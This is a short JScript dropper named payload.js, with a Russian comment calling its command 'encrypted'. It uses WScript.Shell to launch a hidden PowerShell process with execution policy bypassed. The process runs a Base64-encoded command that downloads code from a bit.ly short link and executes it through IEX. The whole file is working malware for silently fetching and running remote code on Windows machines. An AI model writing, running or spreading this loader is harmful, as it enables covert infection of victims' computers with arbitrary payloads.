// payload.js
var shell = new ActiveXObject("WScript.Shell");
// Зашифрованная команда (Base64)
var encodedData = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwA0AHUAaAB5ADIAQwBiACcAKQA=";

var fullCommand = "powershell -NoP -W Hidden -Exec Bypass -EncodedCommand " + encodedData;

shell.Run(fullCommand, 0, false);